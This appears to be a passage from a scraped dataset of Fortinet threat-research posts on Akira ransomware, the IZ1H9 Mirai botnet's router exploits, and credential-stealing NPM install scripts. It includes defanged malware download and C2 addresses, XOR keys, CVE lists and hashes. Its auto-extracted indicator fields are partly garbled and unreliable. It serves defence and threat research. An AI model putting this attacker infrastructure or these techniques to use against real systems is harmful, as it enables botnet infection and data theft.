ransomware 4839fd081e720d7d5091274470679c120378196e1f4faf80c4bac08d8ee7bb8c Windows version of Akira ransomware 678ec8734367c7547794a604cc65e74a0f42320d85a6dce20c214e3b4536bb33 Windows version of Akira ransomware 8bfa4c2c1065b105ec80a86f460e0e0221b39610109cc6cd4b441dd86e6b4aef Windows version of Akira ransomware 89f5f29cf6b5bcfc85b506fb916da66cb7fd398cf6011d58e9409c7813e1a6f3 Windows version of Akira ransomware 379ef7c4f6dfae8cc0c8556861ff41930b88c7d9b107a5de10ccd194e1bda0cb Windows version of Akira ransomware 27009c0abd2709cd5cac4c0135b8f3bed3229b0921601638ba9e90713ede91ea Windows version of Akira ransomware 8738ba49fcd520789569aea7bf7af890741a745c79ae2bef49b93fb46c076c2b Windows version of Akira ransomware 25a6758df930b32eed548fca56735f0ddde442b5662e51c625eadbbaf09c9e96 Windows version of Akira ransomware d371ee0aa4fa710c00173d296c999a5497a18b38c80095db68a2dc5e46ed35f7 Windows version of Akira ransomware 1d3b5c650533d13c81e325972a912e3ff8776e36e18bca966dae50735f8ab296 Linux version of Akira ransomware 82e25f32e01f1898ccce2b6d5292245759733c22a104443a8a9c7db1ebf05c57 Linux version of Akira ransomware 0c0e0f9b09b80d87ebc88e2870907b6cacb4cd7703584baf8f2be1fd9438696d Megazord ransomware (Akira variant) c9c94ac5e1991a7db42c7973e328fceeb6f163d9f644031bdfd4123c7b3898b0 Megazord ransomware (Akira variant) 67afa125bf8812cd943abed2ed56ed6e07853600ad609b40bdf9ad4141e612b4 IQOJ ransomware (Akira variant) 2b28270c1675990a2c78b31faab547fb75948dd1c2b22e892377ee5e40abebc2 ZHQ ransomware (Akira variant) Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP), is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning, to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation. Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-akira",
      "scraped_at": "2025-07-20T13:52:46.469032",
      "indicators": {
        "ip_address": [],
        "domain": [
          "elp-you",
          "ww",
          "owerranges",
          "eadme-asldkas",
          "owershell"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "25a6758df930b32eed548fca56735f0ddde442b5662e51c625eadbbaf09c9e96",
          "772eb611c9ca20b461536fd0bd87d553dcecf3f4c82e26c2378cad40bbf4b0b0",
          "8738ba49fcd520789569aea7bf7af890741a745c79ae2bef49b93fb46c076c2b",
          "678ec8734367c7547794a604cc65e74a0f42320d85a6dce20c214e3b4536bb33",
          "2e2ad6392e75d5a5155498c2a76cb373d17ca3ad4ba57c6d33c623fca5e29342",
          "1b6af2fbbc636180dd7bae825486ccc45e42aefbb304d5f83fafca4d637c13cc",
          "920384692233578a59fc8de2b0205fd9fb20bb0d75c1d5a1534377abf0fc08bc",
          "89f5f29cf6b5bcfc85b506fb916da66cb7fd398cf6011d58e9409c7813e1a6f3",
          "c9c94ac5e1991a7db42c7973e328fceeb6f163d9f644031bdfd4123c7b3898b0",
          "637e28b38086ff9efd1606805ff57aaf6cdec4537378f019d6070a5efdc9c983",
          "1d3b5c650533d13c81e325972a912e3ff8776e36e18bca966dae50735f8ab296",
          "fb2433beb961839b36198e242d0dedb7fa85ab3e08a1141d02874aa4235ac776",
          "379ef7c4f6dfae8cc0c8556861ff41930b88c7d9b107a5de10ccd194e1bda0cb",
          "c239dadd55b55b817fda5b0c2bb062adf399a5b78a8b3280a473d3ae66f81777",
          "27009c0abd2709cd5cac4c0135b8f3bed3229b0921601638ba9e90713ede91ea",
          "d0510e1d89640c9650782e882fe3b9afba00303b126ec38fdc5f1c1484341959",
          "8631ac37f605daacf47095955837ec5abbd5e98c540ffd58bb9bf873b1685a50",
          "4839fd081e720d7d5091274470679c120378196e1f4faf80c4bac08d8ee7bb8c",
          "4aaa583a9c554ea8e73d4dee0d53eb12dda17df16388f96c0f6ddbaafbcda813",
          "473326da3fff09ee3e486f5f39c090690437ac8bf8bdce556c8033e8f0d730fc",
          "cfbcea795524c69a6d28fd9e60e07437d8f2abd23812109430ca2efd46606310",
          "b3f473b0fd752fcd8b0d5983366c4ccccdacdceb8d6ba25fcb02b34c622cca78",
          "7b295a10d54c870d59fab3a83a8b983282f6250a0be9df581334eb93d53f3488",
          "2b28270c1675990a2c78b31faab547fb75948dd1c2b22e892377ee5e40abebc2",
          "3c92bfc71004340ebc00146ced294bc94f49f6a5e212016ac05e7d10fcb3312c",
          "82e25f32e01f1898ccce2b6d5292245759733c22a104443a8a9c7db1ebf05c57",
          "0c0e0f9b09b80d87ebc88e2870907b6cacb4cd7703584baf8f2be1fd9438696d",
          "337d21f964091417f22f35aee35e31d94fc3f35179c36c0304eef6e4ae983292",
          "8bfa4c2c1065b105ec80a86f460e0e0221b39610109cc6cd4b441dd86e6b4aef",
          "d371ee0aa4fa710c00173d296c999a5497a18b38c80095db68a2dc5e46ed35f7",
          "92072945358b605c024b9e3335fb33b82faf33048c56f5529aaf5af4bf0c1b30",
          "4cb8365b18b1c319d374be0b9d219144c20fb8714e9cf346e655f854d2c60170",
          "9ca333b2e88ab35f608e447b0e3b821a6e04c4b0c76545177890fb16adcab163",
          "7613fbb940f83173aea126da5cf4319943155f4df25fd2e880eb0c03b1e273f0",
          "6cadab96185dbe6f3a7b95cf2f97d6ac395785607baa6ed7bf363deeb59cc360",
          "3f4ceeada7ff021c30df1646437d2ab0e55997bbb281444501f6d1f4ea8fa209",
          "2a9257c6c74e37d051f78ed5abaa620b71b27fa3604798af077256a128d911bb",
          "67afa125bf8812cd943abed2ed56ed6e07853600ad609b40bdf9ad4141e612b4",
          "2084ab8f92a86a37a35879378610949e21ea7b5030313655bb82fe6c67772b0d"
        ],
        "cve": [],
        "email": [],
        "url": [
          "https://www.torproject.org/download/.",
          "https://akira"
        ]
      },
      "threat_score": 0.8285588364918466
    }
  },
  {
    "id": "Fortinet_42825",
    "source": "Fortinet",
    "title": "IZ1H9 Campaign Enhances Its Arsenal with Scores of Exploits",
    "text": "FortiGuard Labs Threat Research Affected Platforms:LinuxImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:Critical In September 2023, our FortiGuard Labs team observed that the IZ1H9 Mirai-based DDoS campaign has aggressively updated its arsenal of exploits. Thirteen payloads were included in this variant, including D-Link devices, Netis wireless router, Sunhillo SureLine, Geutebruck IP camera, Yealink Device Management, Zyxel devices, TP-Link Archer, Korenix Jetwave, and TOTOLINK routers. Based on the trigger counts recorded by our IPS signatures, it is evident that peak exploitation occurred on September 6, with trigger counts ranging from the thousands to even tens of thousands. This highlights the campaign's capacity to infect vulnerable devices and dramatically expand its botnet through the swift utilization of recently released exploit code, which encompasses numerous CVEs. In this article, we will elaborate on how this threat leverages new vulnerabilities to control affected devices, along with the details of IZ1H9. Four payloads,CVE-2015-1187,CVE-2016-20017,CVE-2020-25506, andCVE-2021-45382, target D-Link vulnerabilities. These critical-severity vulnerabilities can allow remote attackers to deliver command injection via a crafted request. Another exploit,CVE-2019-19356, targets Netis WF2419. It focuses on exploiting a Remote Code Execution (RCE) vulnerability through the tracert diagnostic tool because of a lack of user input sanitizing. The payload injects in parameter “tools_ip_url” and contains the “User-Agent: Dark” header used in the Dark. IoT Botnet. The campaign also seeks to exploit vulnerabilities discovered in 2021, includingCVE-2021-36380, which affect Sunhillo SureLine versions before 8.7.0.1.1,CVE-2021-33544/33548/33549/33550/33551/33552/33553/33554, which allow arbitrary command execution within the parameters of various pages on Geutebruck products, andCVE-2021-27561/27562, which affect Yealink Device Management (DM) 3.6.0.20. The next exploit targets the Zyxel device’s/bin/zhttpd/ componentvulnerability. If insufficient input validation is found, the attacker can exploit the vulnerability to launch a remote code execution attack on Zyxel EMG3525/VMG1312 before V5.50. The threat actor has also incorporated vulnerabilities discovered in 2023 into their exploit payload list. CVE-2023-1389specifically targets TP-Link Archer AX21 (AX1800), whileCVE-2023-23295impacts Korenix JetWave wireless AP. CVE-2022-40475/25080/25079/25081/25082/25078/25084/25077/25076/38511/25075/25083collectively represent a set of related vulnerabilities that focus on TOTOLINK routers. The last one is an unclear exploit payload. It targets “/cgi-bin/login.cgi” and injects a payload in the “key” parameter. A similar vulnerability affects theProlink PRC2402M router, but it is missing a few parameters to achieve remote code execution. It is unclear if the IZ1H9 campaign misused this payload or if they intended to target other devices. The injected payload in the above vulnerabilities intends to get a shell script downloader “l.sh” from hxxp://194[.]180[.]48[.]100. When the script is executed, it begins by deleting logs to conceal its actions. It then downloads and executes various bot clients to cater to diverse Linux architectures. In the final step, the shell script downloader obstructs network connections on multiple ports. This is achieved by altering the device's iptables rules, as illustrated in Figure 9. IZ1H9, a Mirai variant, infects Linux-based networked devices, especially IoT devices, turning them into remote-controlled bots for large-scale network attacks. The XOR key to decode configuration is 0xBAADF00D, shown in Figure 10. The additional payload downloader URLs can be extracted from the decoded configuration in Figure 11, namely hxxp://2[.]56[.]59[.]215/i.sh and hxxp://212[.]192[.]241[.]72/lolol.sh. Both were employed in May 2023. IZ1H9 also includes a data section with pre-set login credentials for brute-force attacks. The XOR decoding key is 0x54, shown in Figure 12, and the decoded data is in Figure 13. As for the C2 communication, victims first send a check-in message with the parameter “l.expl” to the C2 server “194[.]180[.]48[.]101:5034,” and it responds with a keep-alive message “\\x00\\x00.” Once the compromised devices receive a command from the C2 server, shown in Figure 14, they parse the packet to determine the DDoS attack method, target host, and packet count, if specified, before launching the attack. The message structure is as follows: IoT devices have long been an attractive target for threat actors, with remote code execution attacks posing the most common and concerning threats to both IoT devices and Linux servers. The exposure of vulnerable devices can result in severe security risks. Despite the availability of patches for these vulnerabilities, the number of exploit triggers remains alarmingly high, often numbering in the thousands. What amplifies the impact of the IZ1H9 Campaign are the rapid updates to the vulnerabilities it exploits. Once an attacker gains control of a vulnerable device, they can incorporate these newly compromised devices into their botnet, enabling them to launch further attacks like DDoS attacks and brute-force. To counter this threat, it is strongly recommended that organizations promptly apply patches when available and always change default login credentials for devices. The malware described in this report are detected and blocked byFortiGuard Antivirusas: BASH/Mirai. AEH!tr.dldrELF/Mirai. AT!trELF/Mirai. GG!trLinux/Mirai. L!trLinux/Mirai. REAL!trLinux/Mirai. IZ1H9!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. Fortinet has also released IPS signatures to proactively protect our customers from the threats contained in the exploit list. The URLs are rated as “Malicious Websites” by theFortiGuard Web Filtering service. We also suggest our readers go through the freeNSE training: NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. 194[.]180[.]48[.]1002[.]56[.]59[.]215212[.]192[.]241[.]72 c8cf29e56760c50fa815a0c1c14c17641f01b9c6a4aed3e0517e2ca722238f631e15d7cd0b4682a86620b3046548bdf3f39c969324a85755216c2a526d784c0d7b9dce89619c16ac7d2e128749ad92444fe33654792a8b9ed2a3bce1fee82e6ab5daf57827ced323a39261a7e19f5551071b5095f0973f1397d5e4c2fcc39930b523ea86ebfd666153078593476ca9bd069d6f37fa7846af9e53b1e01c977a178d07f15dd7d055b16d50cb271995b768fdd3ca6be121f6a35b61b917dfa3393834628bcfc40218095c65678b52ce13cea4904ce966d0fd47e691c3cb039871ecafc176f7b692a5ff93c7c66eee4941acf1b886ee9f4c070faf043b16f7e65c11df9ee47c783fbe8c3301ed519033fc92b05d7fd272d35c64b424a7e46c6da43b737ba9e84b5166134d491193be3305afa273733c35c028114d8b1f092940b9a30aa9836174f231074d4d55c819f6f1570a24bc3ed4d9dd5667a04664acb57147 FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/Iz1h9-campaign-enhances-arsenal-with-scores-of-exploits",
      "scraped_at": "2025-07-20T13:52:55.201824",
      "indicators": {
        "ip_address": [
          "3.6.0.20",
          "8.7.0.1"
        ],
        "domain": [
          "",
          "ogin",
          "r",
          "olol"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [
          "CVE-2021-27561",
          "CVE-2022-40475",
          "CVE-2020-25506",
          "CVE-2023-23295",
          "CVE-2015-1187",
          "CVE-2021-36380",
          "CVE-2023-1389",
          "CVE-2016-20017",
          "CVE-2019-19356",
          "CVE-2021-33544",
          "CVE-2021-45382"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.8201892744479496
    }
  },
  {
    "id": "Fortinet_44935",
    "source": "Fortinet",
    "title": "Malicious Packages Hidden in NPM",
    "text": "FortiGuard Labs Threat Research Affected platforms:All platforms where NPM packages can be installedImpacted parties:Any individuals or institutions that have these malicious packages installedImpact:Leak of credentials, sensitive information, source code, etc. Severity level:High Over the past few months, the FortiGuard Labs team has discovered several malicious packages hidden in NPM (Node Package Manager), the largest software registry for the JavaScript programming language. These packages were found through a system dedicated to discover malicious open-source packages from various ecosystems e.g. PyPI, NPM. In this blog, we will look at some of these packages, grouping them based on similar styles of code or functions. In general, most of these malicious packages use install scripts that run pre or post-install. Whenever an NPM package is installed, those scripts are run as well. An example of this is shown below. Every package we found aims to steal sensitive data, such as system or user information, via a webhook or file-sharing link. Let’s explore the sets of packages below. This first set shows an obfuscated index.js script. However, we can identify some clues in the strings that may raise suspicions. Let’s try to simplify this code. After cleaning up the script, we can see it exfiltrates sensitive data, including Kubernetes configurations, SSH keys, and other critical information. It also gathers basic system fingerprinting details, like username, IP address, and hostname, without any prior warning. The index.js in this second set of packages sends an HTTP GET request to a specific URL, including query parameters. It scans for particular files and directories that may contain sensitive information. This script also enables the unauthorized extraction of critical developer data, including source code and configuration files. The targeted files and directories may contain highly valuable intellectual property and sensitive information, such as various application and service credentials. It then archives these files and directories and uploads the resulting archives to an FTP server. In this set, the index.mjs install script uses a Discord webhook to exfiltrate sensitive data, such as system information, username, and folder contents. As with the third set, this fourth set also uses an index.mjs install script and a Discord webhook to exfiltrate sensitive data. But this time, they use an alternate style of coding. This fifth set uses an index.js install script to exfiltrate host and username info and home users’ home directory contents via a webhook. This set—the most commonly found style—uses yet another index.js install script to exfiltrate information. In this set, the packages use an installer.js install script to carry out the attack, similar to the previous two, but we can see that the environment variable ‘NODE_TLS_REJECT_UNAUTHORIZED’ is set to ‘0’. This disables TLS certificate validation, which may make the connection insecure and vulnerable to man-in-the-middle attacks. This package automatically downloads and executes a potentially malicious executable file from a URL to a C:/ directory. This package uses another script style to gather system information, including the victim’s public IP address and then exfiltrates this information to a discord webhook. This blog groups together a collection of malicious NPM packages that use install scripts to steal users’ sensitive info based on styles of code or functions. End users should watch for packages that employ suspicious install scripts and exercise caution. We will continue hunting for and reporting malicious packages to help users avoid becoming victims. Fortiguard AntiVirus detects the malicious files identified in this report as @zola-helpers/client-1.0.1 index.mjs: JS/WebHook. CNYS!tr@zola-helpers/client-1.0.2 index.mjs: JS/WebHook. CNYS!tr@zola-helpers/client-1.0.3 index.mjs: JS/WebHook. CNYS!tr@next-translate-root/i18n-1.0.1 index.mjs: JS/WebHook. CNYS!tr@next-translate-root/i18n-1.0.2 index.mjs: JS/WebHook. CNYS!trsuncorp-styleguide-base-1.0.3 index.mjs: JS/WebHook. CNYS!trsuncorp-styleguide-base-1.0.4 index.mjs: JS/WebHook. CNYS!trsuncorp-styleguide-base-1.0.5 index.mjs: JS/WebHook. CNYS!tr@ag-grid-react/lib-1.0.1 index.mjs: JS/WebHook. CNYS!tr@next-translate-root/locales-1.0.0 index.mjs: JS/WebHook. CNYS!tr@next-translate-root/locales-1.0.1 index.mjs: JS/WebHook. CNYS!tr@next-translate-root/locales-1.0.2 index.mjs: JS/WebHook. CNYS!tr@dtx-company/flowcode-generator-types-200000.0.2 index.js: JS/Agent. OAST!trsquarespace-abtest-1.0.1 index.js: JS/Agent. OAST!trruamel.taml.clib-0.1.2 index.js: JS/Agent. OAST!trregily-1.0.0 index.js: JS/Agent. OAST!trdeveloper-scaffold-full-width-wrapper-1.9.9 index.js: JS/Agent. OAST!trdeveloper-scaffold-full-width-wrapper-21.0.9 index.js: JS/Agent. OAST!tr@abb-americas/angular-utilities-1.0.0 index.js: JS/Agent. OAST!tr@abb-americas/image-scaler-1.0.0 index.js: JS/Agent. OAST!tr@abdulmz/mz-test-1.1.1 index.js: JS/Agent. OAST!tr@ikea-aoa/component-financial-services index.js: JS/Agent. OAST!tr@ikea-aoa/component-lightbox-99.0.1 index.js: JS/Agent. OAST!tr@ikea-aoa/component-popover-99.0.0 index.js: JS/Agent. OAST!tr@cima/prism-utils-23.2.1 installer.js: JS/Agent. OAST!tr.dldr@cima/prism-utils-23.2.2 installer.js: JS/Agent. OAST!tr.dldrdiscorddd.jss-1.4.9 index.js: JS/Agent. CDPC!tr.dldrdiscorddd.jss-1.5.0 index.js: JS/Agent. CDPC!tr.dldrdiscorddd.jss-1.6.4 index.js: JS/Agent. CDPC!tr.dldrsaaaaaaaaaaaaaaaaaaaaaaa-1.4.2 index.js: JS/Agent. CDPC!tr.dldrevernote-thrift-1.9.99 index.js: JS/WebHook. ESY!tren-features-rollout-1.90.9 index.js: JS/WebHook. ESY!tren-conduit-electron-1.90.9 index.js: JS/WebHook. ESY!tren-conduit-electron-auth-1.90.9 index.js: JS/WebHook. ESY!tren-conduit-electron-worker-1.90.9 index.js: JS/WebHook. ESY!tren-thrift-internal-2.30.9 index.js: JS/WebHook. ESY!tren-conduit-electron-renderer-1.90.9 index.js: JS/WebHook. ESY!tr@expue/webpack-0.0.3-alpha.0 index.js: JS/Agent. ATTC!tr@expue/core-0.0.3-alpha.0 index.js: JS/Agent. ATTC!tr@expue/vue3-renderer-0.0.3-alpha.0 index.js: JS/Agent. ATTC!tr@fixedwidthtable/fixedwidthtable-0.0.2 index.js: JS/Agent. ATTC!tr@virtualsearchtable/virtualsearchtable-0.1.1 index.js: JS/Agent. ATTC!trbinarium-crm 1.0.0 index.js: JS/Agent. CFRE!tr.dldrbinarium-crm 1.0.9 index.js: JS/Agent. CFRE!tr.dldrbinarium-crm 1.9.9 index.js: JS/Agent. CFRE!tr.dldrcareer-service-client-0.1.6 index.js: JS/Agent. CFRE!tr.dldrcareer-service-client-0.1.13 index.js: JS/Agent. CFRE!tr.dldrcareer-service-client-0.1.15 index.js: JS/Agent. CFRE!tr.dldrhh-dep-monitoring-0.1.5 index.js: JS/Agent. CFRE!tr.dldrhh-dep-monitoring-0.1.14 index.js: JS/Agent. CFRE!tr.dldrorbitplate-1.0.4 index.js: JS/Agent. CFRE!tr.dldrorbitplate-1.0.6 index.js: JS/Agent. CFRE!tr.dldr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service detects and blocks the download URLs cited in this report as Malicious. TheFortiDevSecSCA scanner detects malicious packages, including those cited in this report that may operate as dependencies in users' projects in test phases, and prevents those dependencies from being introduced into users' products. If you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. @zola-helpers/client-1.0.1 index.mjs MD5: e905c2915762e6c1fa57ff3b444411da @zola-helpers/client-1.0.2 index.mjs MD5: 1e5a38b17453379af9107a9afce0963f @zola-helpers/client-1.0.3 index.mjs MD5: c7325f2347833eba9869926226027330 @next-translate-root/i18n-1.0.1 index.mjs MD5: cb37bd25c3011ffdd10c0db976c77b45 @next-translate-root/i18n-1.0.2 index.mjs MD5: c4bf513d91909de6d8c8e28fe317950a suncorp-styleguide-base-1.0.3 index.mjs MD5: 404c75ee8c8a2241e94773a5f46cd372 suncorp-styleguide-base-1.0.4 index.mjs MD5: 0b4da6e4a3d7f0d43afc1ce5a567aeed suncorp-styleguide-base-1.0.5 index.mjs MD5: fbf108d9534e2a065ba62198d7ab226c @ag-grid-react/lib-1.0.1 index.mjs MD5: 42d7f4f9e4d837c5f1217165e92d0136 @next-translate-root/locales-1.0.0 index.mjs MD5: 312368807bee4e8876acec4dba528f13 @next-translate-root/locales-1.0.1 index.mjs MD5: cb37bd25c3011ffdd10c0db976c77b45 @next-translate-root/locales-1.0.2 index.mjs MD5: c4bf513d91909de6d8c8e28fe317950a @dtx-company/flowcode-generator-types-200000.0.2 index.js MD5: 1b80da13c2d440b51de3e3b1f84b30b6 squarespace-abtest-1.0.1 index.js MD5: 0976fc4401a315d8182828d07b0e4a02 ruamel.taml.clib-0.1.2 index.js MD5: 489af9e516d133f8341bc50068b3a505 regily-1.0.0 index.js MD5: 8333f68439addfe5d80d7cf8646d74f6 developer-scaffold-full-width-wrapper-1.9.9 index.js MD5: c627ce5ec695ea663b88a09fb31ea319 developer-scaffold-full-width-wrapper-21.0.9 index.js MD5: 563cf757e5f61a592f53506c81360e4a @abb-americas/angular-utilities-1.0.0index.js MD5: 2965d88976fee79d1e3ef69e5edc5d83 @abb-americas/image-scaler-1.0.0index.js MD5: 0876c5969dc829f2f56b455ae38a2536 @abdulmz/mz-test-1.1.1index.js MD5: ecd47a29a7e5132f94b1c7c0689e2e5a @ikea-aoa/component-financial-services-99.0.1index.js MD5: 025809495e179b4f7ef0db8af88381e7 @ikea-aoa/component-lightbox-99.0.1index.js MD5: 025809495e179b4f7ef0db8af88381e7 @ikea-aoa/component-popover-99.0.0index.js MD5: 025809495e179b4f7ef0db8af88381e7 @cima/prism-utils-23.2.1 installer.js MD5: 42d84beccb38c08700920b70549f5a87 @cima/prism-utils-23.2.2 installer.js MD5: 25de187869441c3aa506ddc5fe6839ea discorddd.jss-1.4.9 index.js MD5: dc60d3e82ff0273309a2a9e1b7f89ea3 discorddd.jss-1.5.0 index.js MD5: 740eca0a347fe0d0aa8ca8ec4ebf2dd2 discorddd.jss-1.6.4 index.js MD5: 5182a61ee33247e2a426c4ddfe8196dc saaaaaaaaaaaaaaaaaaaaaaa-1.4.2 index.js MD5: 8458b6a4196e5d86e241c758ce89d1e5 evernote-thrift-1.9.99 index.js MD5: 359f456996c39e7882afeda8fbbf226f en-features-rollout-1.90.9 index.js MD5: 0f67856db1e0c466d13079cc9cb16963 en-conduit-electron-1.90.9 index.js MD5: 0f67856db1e0c466d13079cc9cb16963 en-conduit-electron-auth-1.90.9 index.js MD5: 0f67856db1e0c466d13079cc9cb16963 en-conduit-electron-worker-1.90.9 index.js MD5: 0f67856db1e0c466d13079cc9cb16963 en-thrift-internal-2.30.9 index.js MD5: 0f67856db1e0c466d13079cc9cb16963 en-conduit-electron-renderer-1.90.9 index.js MD5: 0f67856db1e0c466d13079cc9cb16963 @expue/webpack-0.0.3-alpha.0 index.js MD5: 084c4c5a1d36fbdab6705a2fbd7e849e @expue/core-0.0.3-alpha.0 index.js MD5: 8b82f6112b22bd67cccc4ad238bfea7c @expue/vue3-renderer-0.0.3-alpha.0 index.js MD5: 084c4c5a1d36fbdab6705a2fbd7e849e @fixedwidthtable/fixedwidthtable-0.0.2 index.js MD5: 084c4c5a1d36fbdab6705a2fbd7e849e @virtualsearchtable/virtualsearchtable-0.1.1 index.js MD5: 37f9d6a97af8d7589bbc11aadcf185ec binarium-crm-1.0.0 index.js MD5: acf9777d3fabc82b49ddb096147de6a9 binarium-crm-1.0.9 index.js MD5: acf9777d3fabc82b49ddb096147de6a9 binarium-crm-1.9.9 index.js MD5: acf9777d3fabc82b49ddb096147de6a9 career-service-client-0.1.6 index.js MD5: 3d1dbd501ebaae4745f6ec37850f9ff5 career-service-client-0.1.13 index.js MD5: 3d1dbd501ebaae4745f6ec37850f9ff5 career-service-client-0.1.15 index.js MD5: 3d1dbd501ebaae4745f6ec37850f9ff5 hh-dep-monitoring-0.1.5 index.js MD5: 3d1dbd501ebaae4745f6ec37850f9ff5 hh-dep-monitoring-0.1.14 index.js MD5: 3d1dbd501ebaae4745f6ec37850f9ff5 orbitplate-1.0.4 index.js MD5: 3d1dbd501ebaae4745f6ec37850f9ff5 orbitplate-1.0.6 index.js MD5: 3d1dbd501ebaae4745f6ec37850f9ff5 Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/malicious-packages-hiddin-in-npm",
      "scraped_at": "2025-07-20T13:53:03.934107",
      "indicators": {
        "ip_address": [],
        "domain": [
          "rruamel",
          "nstaller",
          "ndex",
          "r",
          "iscorddd",
          "index",
          "uamel"
        ],
        "hash_md5": [
          "c7325f2347833eba9869926226027330",
          "084c4c5a1d36fbdab6705a2fbd7e849e",
          "dc60d3e82ff0273309a2a9e1b7f89ea3",
          "0b4da6e4a3d7f0d43afc1ce5a567aeed",
          "8b82f6112b22bd67cccc4ad238bfea7c",
          "5182a61ee33247e2a426c4ddfe8196dc",
          "025809495e179b4f7ef0db8af88381e7",
          "404c75ee8c8a2241e94773a5f46cd372",
          "ecd47a29a7e5132f94b1c7c0689e2e5a",
          "e905c2915762e6c1fa57ff3b444411da",
          "c627ce5ec695ea663b88a09fb31ea319",
          "312368807bee4e8876acec4dba528f13",
          "8333f68439addfe5d80d7cf8646d74f6",
          "0976fc4401a315d8182828d07b0e4a02",
          "0f67856db1e0c466d13079cc9cb16963",
          "563cf757e5f61a592f53506c81360e4a",
          "37f9d6a97af8d7589bbc11aadcf185ec",
          "359f456996c39e7882afeda8fbbf226f",
          "42d84beccb38c08700920b70549f5a87",
          "1b80da13c2d440b51de3e3b1f84b30b6",
          "42d7f4f9e4d837c5f1217165e92d0136",
          "acf9777d3fabc82b49ddb096147de6a9",
          "c4bf513d91909de6d8c8e28fe317950a",
          "fbf108d9534e2a065ba62198d7ab226c",
          "25de187869441c3aa506ddc5fe6839ea",
          "3d1dbd501ebaae4745f6ec37850f9ff5",
          "0876c5969dc829f2f56b455ae38a2536",
          "cb37bd25c3011ffdd10c0db976c77b45",
          "740eca0a347fe0d0aa8ca8ec4ebf2dd2",
          "489af9e516d133f8341bc50068b3a505",
          "8458b6a4196e5d86e241c758ce89d1e5",
          "2965d88976fee79d1e3ef69e5edc5d83",
          "1e5a38b17453379af9107a9afce0963f"
        ],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.802348336594912
    }
  },
  {
    "id": "Fortinet_26730",
    "source": "Fortinet",
    "title": "Threat Actors Exploit the Tensions Between Azerbaijan and Armenia",
    "text": "FortiGuard Labs Threat Research In 1923, the Soviet Union created the Nagorno-Karabakh Autonomous Oblast (an oblast is an administrative region or province) within the Azerbaijan Soviet Socialist Republic. This oblast has a 95% ethnically Armenian population. In 1988, Nagorno-Karabakh declared its intention to leave Azerbaijan and join the neighboring Republic of Armenia. While the Soviet Union was able to keep the resulting tension under control, once the USSR began to collapse, armed conflict between Azerbaijan and Armenia began for control of the Nagorno-Karabakh region. While a ceasefire was tentatively reached in 1994 and again in 2020,tensions remain highbetween the two countries. Affected platforms:Microsoft WindowsImpacted parties:Targeted management associated with an Azerbaijanian companyImpact:Reconnaissance of basic computer info of targeted usersSeverity level:Low In August 2023, FortiGuard Labs discovered an infected memo pretending to come from the current president of a company in Azerbaijan and aimed at the management teams of associated businesses. Opening this memo downloads malware designed to gather basic information from its targets. This blog analyzes the attack chain, reviews the malware’s capabilities, and reveals the possible location of the threat actor behind it. FortiGuard Labs spotted this attack by finding the memo in Figure 2. The memo claims to have information about a border clash between 